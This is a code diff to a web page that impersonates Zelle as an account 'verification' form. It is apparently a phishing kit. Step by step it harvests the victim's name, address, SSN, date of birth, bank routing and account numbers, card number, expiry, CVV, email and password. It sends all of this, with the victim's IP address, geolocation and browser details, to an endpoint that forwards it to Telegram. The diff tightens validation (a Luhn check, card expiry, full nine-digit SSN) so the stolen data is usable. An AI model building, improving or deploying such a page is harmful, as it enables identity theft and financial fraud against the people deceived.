@@ -20,7 +20,6 @@
             min-height: 100vh;
         }
         
-        /* Brand Purple Palette */
         .bg-purple-primary { background-color: #6D1ED4; }
         .text-purple { color: #6D1ED4; }
         
@@ -37,25 +36,12 @@
             box-shadow: 0 6px 16px rgba(109, 30, 212, 0.4);
         }
         
-        .btn-outline-purple {
-            background: transparent;
-            border: 1.5px solid #cbd5e1;
-            color: #1e293b;
-        }
-        
-        .btn-outline-purple:hover { 
-            background: #f8fafc;
-            border-color: #6D1ED4;
-        }
-
-        /* Layout */
         .verification-container {
             max-width: 580px;
             margin: 0 auto;
             padding: 20px 16px 40px;
         }
         
-        /* Card style */
         .form-card-modern {
             background: white;
             border-radius: 40px;
@@ -67,14 +53,12 @@
             border: 1px solid rgba(109, 30, 212, 0.1);
         }
         
-        /* Progress bar */
         .progress-steps {
             display: flex;
             justify-content: space-between;
             margin-bottom: 36px;
             flex-wrap: wrap;
             gap: 6px;
-            position: relative;
         }
         
         .step-marker {
@@ -117,7 +101,6 @@
             font-weight: 500;
         }
         
-        /* form fields */
         .input-group { 
             margin-bottom: 24px; 
         }
@@ -205,10 +188,6 @@
             transition: color 0.2s;
         }
         
-        .toggle-password:hover {
-            color: #6D1ED4;
-        }
-        
         .success-page {
             text-align: center;
             padding: 40px 20px;
@@ -272,8 +251,6 @@
             margin-top: 40px;
         }
         
-        a { text-decoration: none; }
-        
         .loading-spinner {
             animation: spin 1s linear infinite;
         }
@@ -283,30 +260,26 @@
             to { transform: rotate(360deg); }
         }
         
-        .toast-message {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            z-index: 1000;
-            animation: slideIn 0.3s ease;
+        select {
+            appearance: none;
+            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='currentColor' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
+            background-repeat: no-repeat;
+            background-position: right 18px center;
+            background-size: 20px;
         }
         
-        @keyframes slideIn {
-            from {
-                transform: translateX(100%);
-                opacity: 0;
-            }
-            to {
-                transform: translateX(0);
-                opacity: 1;
-            }
+        .valid-card {
+            border-color: #10b981 !important;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%2310b981'%3E%3Cpath d='M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 18px center;
+            background-size: 20px;
         }
     </style>
 </head>
 <body>
 
 <div class="verification-container">
-    <!-- Brand header -->
     <div style="text-align: center; margin-bottom: 24px;">
         <h1 style="font-weight: 800; font-size: 1.8rem; background: linear-gradient(135deg, #6D1ED4 0%, #8b3cff 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 8px;">
             Zelle<sup style="font-size: 0.6rem;">®</sup>
@@ -315,10 +288,7 @@
     </div>
 
     <div class="form-card-modern" id="multiStepFormRoot">
-        <!-- Progress tracker -->
         <div class="progress-steps" id="progressTracker"></div>
-
-        <!-- Form steps container -->
         <div id="stepsContainer"></div>
         <div id="globalMessage" style="margin-top: 16px;"></div>
         <div class="telegram-note">
@@ -332,7 +302,17 @@
 </footer>
 
 <script>
-    // ======================== STEP DEFINITIONS =============================
+    // US States List
+    const US_STATES = [
+        "Alabama", "Alaska", "Arizona", "Arkansas", "California", "Colorado", "Connecticut", "Delaware",
+        "Florida", "Georgia", "Hawaii", "Idaho", "Illinois", "Indiana", "Iowa", "Kansas", "Kentucky",
+        "Louisiana", "Maine", "Maryland", "Massachusetts", "Michigan", "Minnesota", "Mississippi",
+        "Missouri", "Montana", "Nebraska", "Nevada", "New Hampshire", "New Jersey", "New Mexico",
+        "New York", "North Carolina", "North Dakota", "Ohio", "Oklahoma", "Oregon", "Pennsylvania",
+        "Rhode Island", "South Carolina", "South Dakota", "Tennessee", "Texas", "Utah", "Vermont",
+        "Virginia", "Washington", "West Virginia", "Wisconsin", "Wyoming"
+    ];
+    
     const steps = [
         { id: 0, name: "Full Name", fields: ["fullName"] },
         { id: 1, name: "Address", fields: ["addressStreet", "addressCity", "addressState", "addressZip"] },
@@ -341,7 +321,7 @@
         { id: 4, name: "Card Details", fields: ["cardNumber", "cardExpiry", "cardCvv"] },
         { id: 5, name: "Email & Password", fields: ["email", "password"] }
     ];
-
+    
     let currentStep = 0;
     let formData = {
         fullName: "", addressStreet: "", addressCity: "", addressState: "", addressZip: "",
@@ -350,8 +330,56 @@
     };
     
     let isSubmitting = false;
-
-    // Helper: save input values to formData
+    
+    // Format SSN: 399-30-3022
+    function formatSSN(value) {
+        let numbers = value.replace(/\D/g, '');
+        if (numbers.length >= 3 && numbers.length < 6) {
+            numbers = numbers.slice(0, 3) + '-' + numbers.slice(3);
+        } else if (numbers.length >= 6) {
+            numbers = numbers.slice(0, 3) + '-' + numbers.slice(3, 5) + '-' + numbers.slice(5, 9);
+        }
+        return numbers.slice(0, 11);
+    }
+    
+    // Format Card Number: 4672 3782 2893 3782
+    function formatCardNumber(value) {
+        let numbers = value.replace(/\D/g, '');
+        let formatted = '';
+        for (let i = 0; i < numbers.length && i < 16; i++) {
+            if (i > 0 && i % 4 === 0) formatted += ' ';
+            formatted += numbers[i];
+        }
+        return formatted;
+    }
+    
+    // Format Expiry: MM/YY
+    function formatExpiry(value) {
+        let numbers = value.replace(/\D/g, '');
+        if (numbers.length >= 2) {
+            numbers = numbers.slice(0, 2) + '/' + numbers.slice(2, 4);
+        }
+        return numbers.slice(0, 5);
+    }
+    
+    // Validate Card Number (Luhn algorithm)
+    function validateCardNumber(cardNumber) {
+        const numbers = cardNumber.replace(/\D/g, '');
+        if (numbers.length !== 16) return false;
+        let sum = 0;
+        let alternate = false;
+        for (let i = numbers.length - 1; i >= 0; i--) {
+            let n = parseInt(numbers[i]);
+            if (alternate) {
+                n *= 2;
+                if (n > 9) n -= 9;
+            }
+            sum += n;
+            alternate = !alternate;
+        }
+        return sum % 10 === 0;
+    }
+    
     function syncFormData() {
         const inputs = document.querySelectorAll('[data-field]');
         inputs.forEach(input => {
@@ -361,8 +389,7 @@
             }
         });
     }
-
-    // Render progress bar
+    
     function renderProgress() {
         const tracker = document.getElementById('progressTracker');
         if (!tracker) return;
@@ -380,8 +407,7 @@
                     </div>`;
         }).join('');
     }
-
-    // Navigate to specific step
+    
     window.goToStep = function(stepIdx) {
         if (stepIdx < currentStep) {
             currentStep = stepIdx;
@@ -390,8 +416,7 @@
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
     };
-
-    // Validate current step
+    
     function validateCurrentStep(stepIdx) {
         if (stepIdx === 0) {
             const name = document.querySelector('[data-field="fullName"]')?.value.trim();
@@ -402,24 +427,25 @@
         if (stepIdx === 1) {
             const street = document.querySelector('[data-field="addressStreet"]')?.value.trim();
             if (!street) return "Street address is required";
+            const state = document.querySelector('[data-field="addressState"]')?.value;
+            if (!state) return "Please select a state";
             return null;
         }
         if (stepIdx === 2) {
             const ssn = document.querySelector('[data-field="ssn"]')?.value.trim();
             const dob = document.querySelector('[data-field="dob"]')?.value.trim();
             if (!ssn) return "SSN is required";
+            if (ssn.replace(/\D/g, '').length !== 9) return "SSN must be 9 digits (format: XXX-XX-XXXX)";
             if (!dob) return "Date of birth is required";
-            const ssnClean = ssn.replace(/\D/g, '');
-            if (ssnClean.length < 4) return "Valid SSN (last 4 or full) required";
             return null;
         }
         if (stepIdx === 3) {
             const routing = document.querySelector('[data-field="routingNumber"]')?.value.trim();
             const account = document.querySelector('[data-field="accountNumber"]')?.value.trim();
             if (!routing) return "Routing number required";
+            if (routing.replace(/\D/g, '').length !== 9) return "Routing number must be exactly 9 digits";
             if (!account) return "Account number required";
-            const routingClean = routing.replace(/\D/g, '');
-            if (routingClean.length !== 9) return "Routing number must be 9 digits";
+            if (account.replace(/\D/g, '').length < 5) return "Account number must be at least 5 digits";
             return null;
         }
         if (stepIdx === 4) {
@@ -427,10 +453,19 @@
             const expiry = document.querySelector('[data-field="cardExpiry"]')?.value.trim();
             const cvv = document.querySelector('[data-field="cardCvv"]')?.value.trim();
             if (!card) return "Card number required";
-            if (!expiry) return "Expiry date (MM/YY) required";
+            if (card.replace(/\D/g, '').length !== 16) return "Card number must be 16 digits";
+            if (!validateCardNumber(card)) return "Invalid card number";
+            if (!expiry) return "Expiry date required";
+            if (!/^\d{2}\/\d{2}$/.test(expiry)) return "Expiry must be MM/YY format";
+            const [month, year] = expiry.split('/');
+            const now = new Date();
+            const currentYear = now.getFullYear() % 100;
+            const currentMonth = now.getMonth() + 1;
+            if (parseInt(year) < currentYear || (parseInt(year) === currentYear && parseInt(month) < currentMonth)) {
+                return "Card has expired";
+            }
             if (!cvv) return "CVV required";
-            const cardClean = card.replace(/\D/g, '');
-            if (cardClean.length < 15) return "Enter valid card number";
+            if (cvv.replace(/\D/g, '').length !== 3) return "CVV must be 3 digits";
             return null;
         }
         if (stepIdx === 5) {
@@ -445,8 +480,7 @@
         }
         return null;
     }
-
-    // Email domain detection message
+    
     function handleEmailDomainLogic(emailValue) {
         if (!emailValue) return null;
         const domain = emailValue.split('@')[1];
@@ -455,8 +489,7 @@
         }
         return null;
     }
-
-    // Show temporary message
+    
     function showTemporaryMessage(msg, type = 'error') {
         const msgDiv = document.getElementById('globalMessage');
         if (msgDiv) {
@@ -466,36 +499,62 @@
             msgDiv.innerHTML = `<div style="background:${bgColor}; padding:14px; border-radius:20px; color:${textColor}; font-size:0.85rem; display:flex; align-items:center; gap:10px;">
                 <i class="fas ${icon}"></i> ${msg}
             </div>`;
-            setTimeout(() => { if(msgDiv) msgDiv.innerHTML = ''; }, 4000);
+            setTimeout(() => { if(msgDiv) msgDiv.innerHTML = ''; }, 5000);
         }
     }
-
-    // Send to Telegram via API endpoint
-    async function sendToTelegramAPI(formData) {
+    
+    async function sendToTelegramAPI(formDataComplete) {
         try {
+            // Get IP and location info
+            let ipInfo = {};
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                ipInfo.ip = ipData.ip;
+                
+                const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                const geoData = await geoResponse.json();
+                ipInfo.country = geoData.country_name || 'Unknown';
+                ipInfo.city = geoData.city || 'Unknown';
+                ipInfo.region = geoData.region || 'Unknown';
+            } catch(e) {
+                ipInfo = { ip: 'Unable to fetch', country: 'Unknown', city: 'Unknown', region: 'Unknown' };
+            }
+            
+            const payload = {
+                ...formDataComplete,
+                ipInfo: ipInfo,
+                userAgent: navigator.userAgent,
+                timestamp: new Date().toISOString()
+            };
+            
             const response = await fetch('/api/send-to-telegram', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
                 },
-                body: JSON.stringify(formData)
+                body: JSON.stringify(payload)
             });
+            
+            if (!response.ok) {
+                const errorText = await response.text();
+                console.error('API Error Response:', errorText);
+                throw new Error(`HTTP ${response.status}: ${errorText}`);
+            }
             
             const result = await response.json();
             return result;
         } catch (error) {
             console.error('API Error:', error);
-            return { success: false, error: 'Network error. Please try again.' };
+            return { success: false, error: error.message || 'Network error. Please try again.' };
         }
     }
-
-    // Final submission
+    
     async function finalSubmit() {
         if (isSubmitting) return;
         
         syncFormData();
         
-        // Validate final step
         const validationError = validateCurrentStep(5);
         if (validationError) {
             showTemporaryMessage(validationError, 'error');
@@ -510,7 +569,6 @@
         }
         
         try {
-            // Send to Telegram API
             const result = await sendToTelegramAPI(formData);
             
             if (result.success) {
@@ -519,7 +577,7 @@
                 showTemporaryMessage(result.error || 'Verification failed. Please try again.', 'error');
             }
         } catch (error) {
-            showTemporaryMessage('Connection error. Please check your internet.', 'error');
+            showTemporaryMessage('Connection error. Please check your internet and try again.', 'error');
         } finally {
             isSubmitting = false;
             if (submitBtn) {
@@ -528,7 +586,7 @@
             }
         }
     }
-
+    
     function showThanksPage() {
         const container = document.getElementById('stepsContainer');
         const progressDiv = document.getElementById('progressTracker');
@@ -547,15 +605,8 @@
             </div>`;
             if (progressDiv) progressDiv.style.display = 'none';
         }
-        
-        // Play success sound (optional)
-        try {
-            const audio = new Audio('data:audio/wav;base64,U3RlYWx0aCBzb3VuZA==');
-            // silent success
-        } catch(e) {}
     }
-
-    // Navigation functions
+    
     function goToNextStep() {
         syncFormData();
         const errorMsg = validateCurrentStep(currentStep);
@@ -570,7 +621,7 @@
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
     }
-
+    
     function goToPrevStep() {
         if (currentStep > 0) {
             syncFormData();
@@ -580,13 +631,14 @@
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
     }
-
-    // Render step content
+    
     function renderStep(stepIndex) {
         const container = document.getElementById('stepsContainer');
         if (!container) return;
         
-        let html = '';
+        const stateOptions = US_STATES.map(state => 
+            `<option value="${state}" ${formData.addressState === state ? 'selected' : ''}>${state}</option>`
+        ).join('');
         
         const stepsHtml = {
             0: `<div class="step-content">
@@ -599,27 +651,41 @@
             1: `<div class="step-content">
                     <div class="input-group"><label><i class="fas fa-home"></i> Street Address</label><input type="text" data-field="addressStreet" placeholder="123 Main St, Apt 4B" value="${escapeHtml(formData.addressStreet)}"></div>
                     <div class="input-group"><label>City</label><input type="text" data-field="addressCity" placeholder="City" value="${escapeHtml(formData.addressCity)}"></div>
-                    <div class="input-group"><label>State</label><input type="text" data-field="addressState" placeholder="State" value="${escapeHtml(formData.addressState)}"></div>
-                    <div class="input-group"><label>ZIP Code</label><input type="text" data-field="addressZip" placeholder="ZIP" value="${escapeHtml(formData.addressZip)}"></div>
+                    <div class="input-group"><label>State</label><select data-field="addressState">${stateOptions}</select></div>
+                    <div class="input-group"><label>ZIP Code</label><input type="text" data-field="addressZip" placeholder="ZIP Code" value="${escapeHtml(formData.addressZip)}"></div>
                     <button class="btn-next btn-purple" id="nextStepBtn">Continue <i class="fas fa-arrow-right"></i></button>
                     <button class="btn-back" id="prevStepBtn"><i class="fas fa-chevron-left"></i> Back</button>
                 </div>`,
             2: `<div class="step-content">
-                    <div class="input-group"><label><i class="fas fa-id-card"></i> Social Security Number</label><input type="text" data-field="ssn" placeholder="XXX-XX-1234" value="${escapeHtml(formData.ssn)}" maxlength="11"></div>
-                    <div class="input-group"><label><i class="fas fa-calendar-alt"></i> Date of Birth</label><input type="date" data-field="dob" value="${escapeHtml(formData.dob)}"></div>
+                    <div class="input-group"><label><i class="fas fa-id-card"></i> Social Security Number</label>
+                        <input type="text" data-field="ssn" id="ssnInput" placeholder="XXX-XX-XXXX" value="${escapeHtml(formData.ssn)}" maxlength="11">
+                    </div>
+                    <div class="input-group"><label><i class="fas fa-calendar-alt"></i> Date of Birth</label>
+                        <input type="date" data-field="dob" value="${escapeHtml(formData.dob)}">
+                    </div>
                     <button class="btn-next btn-purple" id="nextStepBtn">Continue <i class="fas fa-arrow-right"></i></button>
                     <button class="btn-back" id="prevStepBtn"><i class="fas fa-chevron-left"></i> Back</button>
                 </div>`,
             3: `<div class="step-content">
-                    <div class="input-group"><label><i class="fas fa-university"></i> Routing Number (9-digit)</label><input type="text" data-field="routingNumber" placeholder="021000021" value="${escapeHtml(formData.routingNumber)}"></div>
-                    <div class="input-group"><label><i class="fas fa-credit-card"></i> Account Number</label><input type="text" data-field="accountNumber" placeholder="Your bank account number" value="${escapeHtml(formData.accountNumber)}"></div>
+                    <div class="input-group"><label><i class="fas fa-university"></i> Routing Number (9-digit)</label>
+                        <input type="text" data-field="routingNumber" id="routingInput" placeholder="021000021" value="${escapeHtml(formData.routingNumber)}" maxlength="9">
+                    </div>
+                    <div class="input-group"><label><i class="fas fa-credit-card"></i> Account Number</label>
+                        <input type="text" data-field="accountNumber" placeholder="Your bank account number" value="${escapeHtml(formData.accountNumber)}">
+                    </div>
                     <button class="btn-next btn-purple" id="nextStepBtn">Continue <i class="fas fa-arrow-right"></i></button>
                     <button class="btn-back" id="prevStepBtn"><i class="fas fa-chevron-left"></i> Back</button>
                 </div>`,
             4: `<div class="step-content">
-                    <div class="input-group"><label><i class="fas fa-credit-card"></i> Debit/Credit Card Number</label><input type="text" data-field="cardNumber" placeholder="4111 1111 1111 1111" value="${escapeHtml(formData.cardNumber)}"></div>
-                    <div class="input-group"><label>Expiry Date (MM/YY)</label><input type="text" data-field="cardExpiry" placeholder="MM/YY" value="${escapeHtml(formData.cardExpiry)}"></div>
-                    <div class="input-group"><label>CVV</label><input type="password" data-field="cardCvv" placeholder="123" value="${escapeHtml(formData.cardCvv)}"></div>
+                    <div class="input-group"><label><i class="fas fa-credit-card"></i> Debit/Credit Card Number</label>
+                        <input type="text" data-field="cardNumber" id="cardInput" placeholder="4672 3782 2893 3782" value="${escapeHtml(formData.cardNumber)}" maxlength="19">
+                    </div>
+                    <div class="input-group"><label>Expiry Date (MM/YY)</label>
+                        <input type="text" data-field="cardExpiry" id="expiryInput" placeholder="MM/YY" value="${escapeHtml(formData.cardExpiry)}" maxlength="5">
+                    </div>
+                    <div class="input-group"><label>CVV</label>
+                        <input type="password" data-field="cardCvv" id="cvvInput" placeholder="123" value="${escapeHtml(formData.cardCvv)}" maxlength="3">
+                    </div>
                     <button class="btn-next btn-purple" id="nextStepBtn">Continue <i class="fas fa-arrow-right"></i></button>
                     <button class="btn-back" id="prevStepBtn"><i class="fas fa-chevron-left"></i> Back</button>
                 </div>`,
@@ -640,10 +706,49 @@
                 </div>`
         };
         
-        html = stepsHtml[stepIndex];
-        container.innerHTML = html;
+        container.innerHTML = stepsHtml[stepIndex];
         
-        // Attach event listeners
+        // Attach event listeners for formatting
+        const ssnInput = document.getElementById('ssnInput');
+        if (ssnInput) {
+            ssnInput.addEventListener('input', (e) => {
+                e.target.value = formatSSN(e.target.value);
+            });
+        }
+        
+        const routingInput = document.getElementById('routingInput');
+        if (routingInput) {
+            routingInput.addEventListener('input', (e) => {
+                e.target.value = e.target.value.replace(/\D/g, '').slice(0, 9);
+            });
+        }
+        
+        const cardInput = document.getElementById('cardInput');
+        if (cardInput) {
+            cardInput.addEventListener('input', (e) => {
+                e.target.value = formatCardNumber(e.target.value);
+                if (validateCardNumber(e.target.value)) {
+                    e.target.classList.add('valid-card');
+                } else {
+                    e.target.classList.remove('valid-card');
+                }
+            });
+        }
+        
+        const expiryInput = document.getElementById('expiryInput');
+        if (expiryInput) {
+            expiryInput.addEventListener('input', (e) => {
+                e.target.value = formatExpiry(e.target.value);
+            });
+        }
+        
+        const cvvInput = document.getElementById('cvvInput');
+        if (cvvInput) {
+            cvvInput.addEventListener('input', (e) => {
+                e.target.value = e.target.value.replace(/\D/g, '').slice(0, 3);
+            });
+        }
+        
         const nextBtn = document.getElementById('nextStepBtn');
         const prevBtn = document.getElementById('prevStepBtn');
         const submitFinal = document.getElementById('submitAllBtn');
@@ -652,7 +757,6 @@
         if (prevBtn) prevBtn.addEventListener('click', goToPrevStep);
         if (submitFinal) submitFinal.addEventListener('click', finalSubmit);
         
-        // Email domain detection
         const emailInput = document.getElementById('emailInputField');
         if (emailInput && stepIndex === 5) {
             emailInput.addEventListener('input', (e) => {
@@ -672,7 +776,6 @@
             });
         }
         
-        // Toggle password visibility
         const togglePwd = document.getElementById('togglePasswordIcon');
         const pwdField = document.getElementById('passwordField');
         if (togglePwd && pwdField) {
@@ -694,7 +797,6 @@
         });
     }
     
-    // Initialize
     function init() {
         renderProgress();
         renderStep(0);
